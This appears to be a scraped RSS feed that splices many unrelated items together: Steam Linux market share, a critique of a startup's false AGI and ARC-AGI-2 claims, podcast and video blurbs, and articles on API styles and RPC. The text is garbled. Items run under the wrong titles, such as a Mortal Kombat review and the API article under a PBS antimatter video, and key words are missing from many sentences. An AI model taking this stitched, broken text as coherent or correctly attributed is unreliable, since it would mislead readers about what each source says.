The only time Steam on Linux use was close to the 3% mark was when Steam on Linux initially debuted a decade ago and at that time the overall Steam user-base was much smaller than it is today. Long story short, thanks to the ongoing success of Valve's Steam Deck and other handhelds plus Steam Play (Proton) working out so well, these October numbers are the best yet... a hearty 0.41% increase to Linux... landing its overall marketshare at 3.05%. Windows meanwhile was at 94.84% (falling below 95% for the first time in a while) and macOS at 2.11%. For comparison, in October 2024 Steam on Linux was at 2.00%. 

The Linux-specific data shows SteamOS commanding around 27% of all the Linux installs at large.

Since there are apparently multiple people on board, and they claim to be looking for investors, I think the balance falls in favor of disclosure.Last week Prothean Systems announced they’d surpassed AGI and called for the research community to “verify, critique, extend, and improve upon” their work. Unfortunately, Prothean Systems has not published the repository they say researchers should use to verify their claims. However, based on their posts, web site, and public GitHub repositories, I can offer a few basic critiques.We present Prothean Emergent Intelligence, a novel five-pillar computational architecture that achieved 100% accuracy on all 400 tasks of the ARC-AGI-2 challenge in 0.887 seconds.This system achieved 100% accuracy on all 400 tasks of the ARC-AGI-2 challenge in 0.887 seconds—a result previously considered impossible for artificial intelligence systems.ARC-AGI-2 is specifically designed to resist gaming:No training data availableIt is not possible to solve “all 400 tasks of the ARC-AGI-2 challenge” because ARC-AGI-2 does not have 400 evaluation tasks to solve. Nor is it true that ARC-AGI-2 has no training data. The ARC-AGI-2 web site and docs are clear about this: the workload consists of “1,000 public training tasks and 120 public evaluation tasks”.Step 3: Obtain ARC-AGI-2 Dataset
wget https://github.com/fchollet/ARC-AGI/arc-agi-2-dataset.zip
Prothean Systems repeatedly claims that its operations are purely local. The announcement post states:🧬 WE SURPASSED AGI. THIS IS EGI. NOT AI. HERE’S THE PROOF.Welcome to Prothean EGI.
──────────
After years of research and months of physical development, I’ve been building something that shouldn’t exist yet.After months of solo development, I put together a small strike force team—the Prothean Systems team—to bring this vision to life.Prothean Systems — Emergent General Intelligence (EGI) that lives on your device, remembers everything, and never leaves your hands.No servers. No uploads. No corporate AI deciding what you can know.The demo on beprothean.org also advertises “no servers” and “zero uploads”. This is obviously false. Typing almost anything into this box, such as “what are the five pillars”, triggers two queries to Wikipedia and ten messages, including a mix of reads and writes, to the Firebase hosted database service:Prothean’s launch video explains that Prothean uses a multi-tier compression system called “Memory DNA”. This system “actually looks at the data, understands its characteristics, and then applies the absolute best compression technique for it”. The white paper lists nine compression tiers:
1.  (40% reduction) - Core meaning preservation
2.  (25% reduction) - Recurring structure identification
3.  (15% reduction) - φ-ratio temporal organization
4.  (10% reduction) - Frequency-domain optimization
5.  (8% reduction) - Relevance-based filtering
6.  (6% reduction) - Meta-pattern extraction
7.  (4% reduction) - φ-importance scaling
8.  (3% reduction) - Age-based compression
9.  (2% reduction) - Final integrationProthean advertises a system called “Guardian”: an “integrity firewall that validates every operation” and “detects sensitive data, prevents drift, enforces alignment at runtime”. The demo does not appear to address drift or alignment in any way. Instead, it matches strings against three regular expressions, looking for things like e-mail addresses, credit cards, and API keys.The white paper describes a “Radiant Data Tree” structure, which uses a "Fibonacci-branching tree structure with φ-ratio organization. The depth of this tree is given as:Depth(n) = φ^n / √5  (rounded to nearest Fibonacci number)Depth is a property of a specific node, not a tree as a whole—I assume they mean . In either case this is impossible. The height and maximum depth of a tree are bounded by the number of edges between the deepest node and the root. Trees cannot have a height which grows as φ, because this implies that the depth increases  than the number of nodes. Per this equation, a “Radiant Data Tree” containing just six nodes must have a height of eight—and must therefore contain at least nine nodes, not six.The white paper also introduces a transcendence score  which measures “mathematical beauty and emergent capability”:T = (0.25×C + 0.25×(1-M) + 0.3×N + 0.2×P) × φ mod 1.0
C = Complexity handling (0 to 1)M = Memory compression ratio (0 to 1)N = Neural emergence score (0 to 1)P = Pattern recognition quality (0 to 1)φ = golden ratio (1.618…)Speaking broadly, a quality metric should increase as its inputs improve. This score does not. As each metric improves, the transcendence score rises—until roughly halfway through it reaches one, and immediately wraps around to zero again. Consequently, small improvements in (e.g.) “pattern recognition quality” can cause  to fall dramatically. The white paper goes on to claim specific values from their work which are subject to this modular wrapping.There’s a lot more here, but I don’t want to burn too much time on this.Based on the commit history and prose style, I believe Prothean is largely the the product of Large Language Models (LLMS). LLMs are very good at producing plausible text which is not connected to reality. People also  talking to LLMs: the architecture, training processes, and financial incentives around chatbots bias them towards emitting agreeable, engaging text. The technical term for this is “sycophancy”.Please be careful when talking to LLMs.]]></content:encoded></item><item><title>The First Day of the Somme</title><link>https://shows.acast.com/dansnowshistoryhit/episodes/the-first-day-of-the-somme</link><author></author><category>podcast</category><enclosure url="https://sphinx.acast.com/p/acast/s/dansnowshistoryhit/e/690342a395ee8b1815e651c0/media.mp3?tk=eyJ0ayI6ImRlZmF1bHQiLCJhZHMiOnRydWUsInNwb25zIjp0cnVlLCJzdGF0dXMiOiJwdWJsaWMifQ==&amp;sig=8IXEobUx0mqHrDOwKrkpm1qk6yi_U04lnXlJnRaNemw" length="" type=""/><pubDate>Mon, 3 Nov 2025 00:30:00 +0000</pubDate><source url="https://www.historyhit.com/podcasts/">Podcast - HistoryHit</source><content:encoded><![CDATA[In partnership with Findmypast, Dan narrates the extraordinary story of the bloodiest day of the First World War.

The answers to such questions make up the topic of our video today- the first in a two-part series on the mysterious workings of Time. 

This one was both a challenge and a privilege to work on, Part 2 will be released towards the end of the month and will be... different.

You’ll also get 20% off an annual premium subscription.

In this video, we explore how China’s dominance in rare earth elements has become a powerful geopolitical tool—and why the United States is struggling to catch up. From the Mountain Pass mine in California to Apple’s $500 million recycling push, we unpack the strategic importance of rare earths in everything from electric vehicles and smartphones to fiber optics and missile systems.
We also look at the recent Trump–Xi summit, the temporary truce on export controls, and the deeper tensions that remain unresolved. Why are rare earths so hard to substitute? How does China’s export licensing regime work? And what happens if the U.S. gets cut off?

🔍 Topics covered:

Rare earths in global supply chains
China’s export controls and licensing strategy
U.S. efforts to rebuild domestic production
Military vs civilian demand for rare earths
Recycling, substitution, and strategic stockpiling

Some were physically attached to interstellar spacecraft, while others were beamed into space in the form of radio signals. This video provides a detailed chronology of almost all of these messages with a focus on their meaning and improbability of reception.

You might have heard of TRAPPIST-1. Discovered in 2017, this system of rocky planets orbiting a red dwarf star has been hailed as the most promising place to search for life outside our solar system. 

And now, one of these planets has just got even more exciting. New observations from the James Webb Telescope reveal the most compelling evidence yet: planet TRAPPIST-1e might have an Earth-like atmosphere. Join us to see what JWST found and why this could be huge.

If so, you may have heard of the ancient tradition of keening or the superstition of the 'hungry grass'. In this episode, Dan is joined by the hosts of the After Dark podcast, Dr Anthony Delaney and Dr Maddy Pelling, to explore some of the historic rites and beliefs surrounding death and mourning in Ireland. Anthony explains the role of 'keening women' - once persecuted by the government and the church - who would wail and lament at the graveside (and air any mistakes the deceased may have made) as well as the procession down the 'corpse road' and the customs of covering mirrors and opening the window at the point of death.Warning: this episode has an instance of explicit language.Produced by Freddy Chick and edited by Matthew Wilson and Dougal Patmore]]></content:encoded></item><item><title>Why Antimatter Engines Could Launch In Your Lifetime</title><link>https://www.youtube.com/watch?v=eA4X9P98ess</link><author>PBS Space Time</author><category>yt</category><enclosure url="https://www.youtube.com/v/eA4X9P98ess?version=3" length="" type=""/><pubDate>Thu, 30 Oct 2025 20:15:00 +0000</pubDate><source url="https://www.youtube.com/channel/UC7_gcs09iThXybpVgjHZ_7g">PBS Space Time</source><content:encoded><![CDATA[Thanks to Displate for sponsoring the video.

For its next project, the studio set its sights on the history behind one of the most famous properties in gaming: Mortal Kombat.Mortal Kombat Legacy Collection is a loving tribute to the early years of the trailblazing fighting game franchise. Over 20 games from kombats past, across multiple formats, are expertly restored, all highlighted by a deep-dive documentary into the history of the series, as well as the studios, and the notable names responsible for them. And Digital Eclipse has once again set the bar for preservation, as this is a collection worthy of Mortal Kombat's legacy.MK Legacy Collection immediately impresses with its game selection. Twenty-three Mortal Kombat games, including arcade, console, and handheld versions, are all included here, and they look and feel exactly as they did when they originally launched.

Over time, as applications evolved, so did the challenges they faced.This led to the creation of new API styles, each designed to solve specific problems related to performance, flexibility, or real-time updates.In this article, we’ll break down the  that power modern software.In the beginning, there was SOAP (Simple Object Access Protocol).As the internet began to rise in the late 1990s, companies needed a standardized way for applications to communicate across different platforms and programming languages.SOAP emerged as the first major standard to solve this.SOAP demands that all messages be in  format, and it operates based on a very strict contract called a WSDL (Web Services Description Language).Think of WSDL as a detailed instruction manual that precisely defines every operation you can perform.SOAP is very “verbose,” meaning it uses a lot of text to describe a simple action. All that text for one simple request makes messages large, which  network transmission and processing.Furthermore, the strict WSDL contract creates ; if the server changes any part of the contract, the client will often break.While this was acceptable for large, internal enterprise systems, SOAP was just too heavy and inflexible for the fast moving web and new mobile apps. Developers needed something simpler, lighter, and more flexible that used the web’s own language, HTTP.In response to SOAP’s complexity, REST (Representational State Transfer) emerged and it quickly became the standard for the modern web.REST represented a complete mindset shift. Instead of complex operations defined in a WSDL, REST treats data as “resources” (like ) that you interact with using the standard HTTP methods (GET, POST, PUT, DELETE) that power the entire web.It is , meaning every request contains all the information needed to process it. It also embraced  over XML, which is far lighter and easier for both humans and machines (especially JavaScript) to read.REST is amazing and runs the majority of the web. But as applications grew, two common problems emerged: Clients often receive more data than they need. You just need a user’s name, but  returns their name, address, entire post history, and a dozen other fields. This is wasted data that slows down apps, especially on mobile networks. You need to show a user’s profile  their latest posts. This requires two separate requests:  and then . This “waterfall” of requests creates noticeable lag.As frontend applications grew richer especially with mobile and single-page apps, developers wanted more control over the data they fetched.This led to the rise of .What if you could ask for  what you need, all in one trip? That’s what Facebook set out to solve when they created in 2012 and open-sourced in 2015.GraphQL is a query language for your API. The most important shift is that the , not the server, defines the shape of the data it needs. Instead of dozens of REST endpoints, you typically have just one (like ) that accepts a query. The client sends a query that precisely describes the data it wants, and the server returns a JSON object in that exact same shape.This single query can pull from multiple sources (like a user database and a post database) and return it all in one response.There is no  (you only get the  and , not the user’s email or post bodies) and no  (you get the user and their posts in one round trip).However, GraphQL introduces its own set of challenges:Complex Server Implementation: Building a GraphQL server (especially with nested data) can be more complex than a simple REST API. The single endpoint and dynamic queries make traditional HTTP caching mechanisms less effective compared to REST.GraphQL shares a fundamental trait with REST: it’s text based (JSON) and works on a client “pull” model, where the client must make a request.For high-performance internal communication between dozens of microservices, the overhead of parsing text and the HTTP request-response pattern is too slow.This need for raw speed led to .Developed by Google and open-sourced in 2015, gRPC is a modern Remote Procedure Call (RPC) framework designed for high-performance, language-agnostic communication  services.It’s built for performance in two key ways: It replaces text-based JSON with Protocol Buffers (Protobufs), a highly efficient binary format. This is much faster for computers to  (write) and  (read). It runs on  by default. This modern protocol is far more efficient than HTTP/1.1, supporting features like , where many requests can fly back and forth on a single connection.You define your services and messages in a simple  file. This file acts as a language-agnostic contract, which gRPC uses to generate native code for any language you need (Java, Go, Python, etc.).gRPC is an excellent choice for internal Service-to-Service Communication, especially over low-bandwidth networks.However, its binary format is not human-readable, which can make debugging more challenging. It also isn’t directly supported by browsers, requiring a proxy like gRPC-Web for client-side use.Although highly performant, gRPC is still a request-response pattern: the client asks, the server answers.What if you need a persistent, two-way connection for a live chat app, a stock ticker, or a multiplayer game?That’s where  comes in.Traditional HTTP, which underpins REST, GraphQL, and gRPC, is a  protocol. The client must always initiate the conversation.This becomes inefficient for real-time use cases, because the only way to constantly get updates is to repeatedly ask the server () or keep a request hanging until something happens (). was built to solve exactly this. It creates a ,  communication channel over a single connection.The connection begins as a normal HTTP request, then upgrades to a WebSocket. After that, both client and server can send data to each other whenever they want without new requests.Client-side code example:This model is perfect for live dashboards, multiplayer gaming, or chat applications where the server must push updates instantly.But running WebSockets at scale is not trivial. You have to manage millions of long-lived connections, ensure state consistency across servers, and handle reconnects and failures.Another limitation: the client must initiate the connection first. That works for browsers and apps, but fails for server-to-server events.For example, what if Stripe’s server needs to notify  server that a payment just succeeded? Your server isn’t sitting there with an open connection to Stripe.In such cases, we need a different mechanism:  a .Webhooks are essentially “reverse APIs.” Instead of your application polling an API endpoint for new data, the  calls  (acting as the client) when a specific event occurs. It’s a user-defined HTTP callback.A Webhook is a server to server push model. You provide a URL (an endpoint on your server) to a third party service like GitHub, Stripe, or Slack. When a specific event happens (like a  or a ), that service instantly sends an HTTP POST request with the event data (the payload) to your URL.Webhooks eliminate the need for constant polling, allowing systems to react to events asynchronously and saving resources for both the client and the server.Despite their power, Webhooks require careful implementation: Your endpoint is public. You  verify a signature (like ) to ensure the request is legitimate and not a forgery. Webhooks can fail and be retried. Your endpoint must be , meaning processing the same notification multiple times has the same effect as processing it once.As you can see, there is no single “best” API. The “best” API is the one that fits your use case. In fact, a single, complex application will often use many of them together: or  for its public web and mobile apps. for its internal, high speed microservice communication. for its real time chat feature. to receive events from its payment provider.The journey from SOAP to Webhooks shows an evolution towards more specific, efficient, and flexible tools. The real skill is not knowing just one, but knowing which one to pick for the job.If you found it valuable, hit a like ❤️ and consider subscribing for more such content.If you have any questions or suggestions, leave a comment.This post is public so feel free to share it.

It uses the Model Context Protocol (MCP) to securely connect AI models with data sources while maintaining provider freedom. This gives organizations the ability to run AI-driven automation without relying on a single ecosystem. With a 16-year lifecycle, reproducible builds, instant rollback capabilities, and post-2038 readiness, SLES 16 also doubles down on long-term reliability and transparency.
 
For enterprises, this launch marks a clear step toward embedding intelligence at the infrastructure level. The system can now perform AI-assisted administration via Cockpit or the command line, potentially cutting downtime and operational costs. SUSE's timing might feel late given the AI boom, but its implementation appears deliberate -- balancing innovation with the stability enterprises demand. It's likely to pressure Red Hat and Canonical to follow suit, redefining what "AI-ready" means for Linux in corporate environments.]]></content:encoded></item><item><title>The humanoid-robot dystopia arrived early...</title><link>https://www.youtube.com/watch?v=q2czJLPJ4nA</link><author>Fireship</author><category>dev</category><enclosure url="https://www.youtube.com/v/q2czJLPJ4nA?version=3" length="" type=""/><pubDate>Wed, 29 Oct 2025 18:10:55 +0000</pubDate><source url="https://www.youtube.com/channel/UCsBjURrPoezykLs9EqgamOA">Dev - Fireship</source><content:encoded><![CDATA[Get up to 67% off VPS during Hostinger’s Black Friday sale.

One thing I didn't mention is part of why it had such a big impact: It was a massive improvement in scope, gameplay, and storytelling over the two preceding Dragon Quest titles. With DQIII HD's sales success and its chronological position as the first part of a story trilogy, Square Enix releasing a similar HD-2D remake of the first two titles made perfect sense.And here we are now, with Dragon Quest I and II HD Remake--the other chapters in the Erdrick trilogy, now gussied up with Square Enix's lavish 2D-sprites-on-3D-backgrounds style of graphical presentation. Jumping into these games for the first time in well over two decades, I was surprised to see just how much effort went into "modernizing" them--not just in terms of mechanics, but also to build upon their basic "hero(es) take up arms against an evil force" narratives with more dialogue, setpieces, and story beats. Yet even with all of the enhancements, one game in this bundle clearly comes out as the superior adventure--but still not quite up to the heights of the previous release.If you're at all familiar with Dragon Quest, you know what to expect here: classic fantasy JRPG adventures, packed with random-encounter turn-based combat, dungeon exploration, fetch quests, and vanquishing the forces of darkness with the light of heroism. Dragon Quest I is a strictly solo journey--it's just your brave little hero, going mano-a-mano with the enemy hordes--while DQII uses the series' now-traditional party system. Though the two games play similarly, having a party makes a world of difference in combat: extra meatshields and actions allow for distinct strategies to take shape, making for more dynamic and enjoyable fights.Continue Reading at GameSpot]]></content:encoded></item><item><title>How RPC Actually Works</title><link>https://newsletter.systemdesign.one/p/how-rpc-works</link><author>Neo Kim</author><category>dev</category><enclosure url="https://substack-post-media.s3.amazonaws.com/public/images/6952f430-02f4-4dbb-8054-20b9dc33b9d0_1280x720.png" length="" type=""/><pubDate>Wed, 29 Oct 2025 11:03:09 +0000</pubDate><source url="https://newsletter.systemdesign.one/">Dev - System Design Newsletter</source><content:encoded><![CDATA[Download my system design playbook for FREE on newsletter signup:This post outlines how RPC works.How do hundreds of internal services at a company like Netflix or Google talk to each other? And that too, at millions of times per minute?A standard REST API, while great for public use, often creates too much overhead for this internal, high-speed chatter. Because it typically uses text-based formats like JSON. While easy for humans to read, it’s inefficient for services that need to have millions of conversations per day.Instead, these services need to talk in a language that is incredibly compact and fast for computers to process. Plus, they need a pre-agreed set of rules, like a shared blueprint, that guarantees both sides know exactly how to talk to each other without errors.And most importantly, it should offer a good developer experience without sacrificing performance.Modern applications use many distributed services. Yet this creates a core challenge:How to achieve extreme machine-to-machine efficiency? A function call across a network should feel as simple as a local one.The answer is Remote Procedure Call). It’s a protocol designed for high-performance internal communication.I want to introduce Ashutosh as a guest author.He’s a software engineer at YouTube, ex-Google Search, and Microsoft Azure.Connect with him if you want to get deep dives into system design, AI, and software engineering. is a conversational AI and career matchmaker that works on behalf of each person. You spend 15-20 minutes on the phone with him, talking about your experience, your ambitions, and your non-negotiables.Dex then scans thousands of roles and companies to identify the most interesting and compatible opportunities.Once we’ve found a match,  connects you to hiring managers and even helps you prep for interviews.Thousands of exceptional engineers have already signed up, and we’re partnered with many of the UK’s leading start-ups, scale-ups, hedge funds, and tech companies.Don’t waste another day at a job you hate. Speak with Dex today.What Is a Remote Procedure CallRPC is a protocol that allows a function call to cross from one program’s address space into another. This frees the developer from manually managing the raw network connection points () or translating data into a sendable format ().When your code calls a function like , you aren’t concerned with the complex algorithm running inside the math library. You simply trust its public API and know the function’s signature.RPC extends this exact concept across the network.The client application gets a stub object - a local proxy that mirrors the remote service’s API. But its methods contain only the logic to forward the call over the network. When you call a function on this stub, it handles all the complex network communication behind the scenes to execute the code on the server.So, a call like result = paymentService.charge(userId, amount)doesn’t call the payment logic directly. Instead, it calls a local proxy method, which then makes a remote operation. This makes the remote call feel like a simple local library call.Before we go further, let’s understand this first:How Remote Procedure Call Works1. Client Stub (The Local Representative)Your code doesn’t call the remote service directly. Instead, it talks to the  - a local representative whose only job is to act as a stand-in for the remote service.It has the same methods you want to use, for example, “. But its real purpose is to kick off the remote communication process.2. Marshaling (Packing the Message)The stub takes the parameters you provided, like ,  and marshals them. Marshaling is a fancy word for serializing. It means converting the data from a programming language format to a standardized format, so you can send it over the network.Think of it as neatly packing your instructions into a universal shipping container that any server in the world can open. This format is often JSON or a more compact, faster format like Protocol Buffers.The client then sends this packed message across the network to the server, using efficient protocols like HTTP/2. This is the “remote” part of the call.On the server, a “skeleton” is listening. It’s the counterpart of the client stub.Its job is to receive the incoming message and unmarshal (or deserialize) it. Imagine unpacking the shipping container back into a data format the server can understand.The skeleton then calls the actual service method with this unpacked data.After the server finishes its work, the entire process happens in reverse.The skeleton marshals the return value, for example, . Then sends it back across the network, and the client stub unmarshals it.After that, the line of code that made the original call receives the result.Next, I’ll walk you through different RPC failure scenarios and approaches to handle them.Handling Failures in Remote Procedure CallIn a distributed system, the network might be unreliable.Connections drop. Services slow down. Failures occur.A robust RPC implementation isn’t just about successful calls, but also about gracefully handling failures. Here are some strategies:1. Timeouts (Don’t Wait Forever)A timeout is a simple deadline. Whenever the client makes a request, it starts a timer. If it doesn’t receive a response before the timer runs out, it gives up on the call.: Without timeouts, your application could get stuck waiting indefinitely for a response from a slow or dead service. This would tie up resources, such as threads or memory, and could eventually freeze your entire application. Timeouts are the first line of defense to protect the client’s health.2. Retries (If at First Call Doesn’t Succeed)Many network errors are transient: a temporary glitch that quickly resolves itself.Sometimes, a server might take too long to respond, or a network packet might get lost in transit. In these cases, it makes sense to retry the failed request automatically.Important Caveat (Idempotency): Yet retries can be dangerous if the same request causes side effects each time it runs. An operation is idempotent if performing it many times has the same effect as doing it once.Safe to Retry (Idempotent): Getting a user’s account balance. Doing it again won’t change the system’s state.Dangerous to Retry (Not Idempotent): Charging a user’s credit card. Retrying it might cause duplicate payments.So developers must design their systems with idempotency safeguards, such as unique transaction IDs, to retry safely.3. Circuit Breakers (Protecting the System)When a service fails or slows down, sending it more requests will only make things worse.A circuit breaker is a smart pattern that prevents this from happening.If the client notices many failed calls to a service, the circuit breaker “trips” and stops sending requests to that service for a short time. During this period, any new calls fail instantly instead of being sent over the network. Circuit breakers prevent cascading failures. They give the failing service time to recover. And keep the client from wasting time and resources on calls that are likely to fail.4. Deadline Propagation (Don’t Start Work You Can’t Finish)A single user request often triggers a chain of calls between several services. For example, Service A calls B, and B calls C.If the original request has a total timeout of 500ms, and Service A already uses 300ms. Then there’s no point in Service C starting a task that takes another 400ms because the client would have already stopped waiting. fixes this by passing the remaining time limit along with every call. So each service knows the remaining time and can decide whether it can finish its part before the deadline.This approach prevents wasted work and keeps the system fast and responsive. Services can “fail fast” instead of doing long operations for a request that’s already too late to matter.Like every technology, RPC isn’t perfect; it has some strengths, but also tradeoffs to watch out for. Let’s keep going!RPC: The Good, the Bad, and the UglySimple programming model: You can call remote functions just like local ones, which makes your code cleaner and simpler.High performance: RPC uses compact, binary formats that computers can process quickly.Strong typing: Because both sides share a strict contract, it often detects mistakes early before they cause problems.Language interoperability: Client and server can use different programming languages and still communicate smoothly.Tight coupling: If the server’s API changes, the client usually needs to update too, which can slow down development.Less discoverable than REST: You can’t easily test or browse RPC APIs without the specific contract files.Requires specialized tooling: You need special tools to generate the code for the client and server.Abstraction hides network realities: Because remote calls look like local ones, developers might forget they’re dealing with the network and forget to handle timeouts or errors properly.Now let’s look at how RPC actually works in real-world systems and the challenges of running it at scale.Using RPC in real systems comes with several practical challenges. Here are four common ones developers need to handle:1. Service Discovery (How Do Services Find Each Other?)In modern systems, servers are always changing; they’re added, removed, or restarted, often getting new IP addresses.But you can’t just hardcode a server’s location in your code. So how does a client know where to send its request?That’s where  comes in.Think of it like a live, self-updating contact list. You don’t need to remember your friend’s exact home address. Instead, you simply look up their name in your contact list to find the latest address.A central registry (like Consul or Zookeeper) keeps track of all healthy, running services and their locations. So when a client wants to talk to the Payment Service, it asks the registry, “Where can I find it?”.The registry then returns a list of healthy servers, and the client picks one to send the RPC call.2. API Evolution (How Do You Update Services Without Breaking Everything?)When a service adds a new feature, it might need to change a function’s parameters. Things can break if clients do not update right away; this is because of tight coupling.The solution is .Think of a survey form you’ve sent out. You can safely add a new optional question; old forms still work. But if you delete a question or make a new one required, all old forms become invalid.RPCframeworks like gRPC follow strict rules for updating APIs. For example, you can safely add optional fields, but you shouldn’t remove or change existing ones. This allows new versions of a service to run smoothly while older clients keep working.3. Streaming (More Than Just Request and Response)RPC doesn’t limit itself to the “one request, one response” model.Modern frameworks like gRPC support , where data flows continuously between client and server.A regular RPC call is like sending a text message and getting one reply. A streaming RPC is like a live phone call or video stream; both sides can exchange information in real time.Server Streaming: Client sends one request and gets back a stream of responses (e.g., subscribing to live updates).Client Streaming: Client sends a stream of messages and gets back one response (e.g., uploading a large file).Bidirectional Streaming: Both client and server can send messages at any time (e.g., a real-time chat).4. Error Handling & Status Codes (Communicating What Went Wrong)When something fails, the client needs more detail than just an “it failed” message. So it can take the necessary steps.That’s where  come in.Just like HTTP status codes (404 Not Found, 403 Forbidden, 500 Internal Server Error), RPC frameworks have their own standardized codes:By returning a specific error code, the server tells the client what to do next.Retry the call if the service was temporarily unavailable.Report a user input error if the argument was invalid.Or stop trying if it's impossible to fix the problem automatically.Now that we’ve seen RPC in real-world systems, let’s look at how it compares to other communication patterns.Choosing the Right Communication PatternRPC (gRPC, Thrift): Best for high-performance internal microservices.REST: Ideal for public APIs and resource-oriented operations.GraphQL: Great for client-specific data fetching requirements.Message Queues: Perfect for asynchronous, decoupled workflows.RPC hides most of the network details, but it doesn’t make them disappear; you still need to design for failures.While gRPC with Protocol Buffers has become the new standard for fast, reliable communication between internal services.Remember, a successful RPC setup depends on supporting systems. So service discovery, tracing, and monitoring are necessary to keep everything running smoothly.👋 I’d like to thank  for writing this newsletter!Plus, don’t forget to connect with him on:He offers good deep dives into system design, AI, and software engineering.Subscribe to get simplified case studies delivered straight to your inbox:Want to advertise in this newsletter? 📰Thank you for supporting this newsletter.You are now 180,001+ readers strong, very close to 181k.
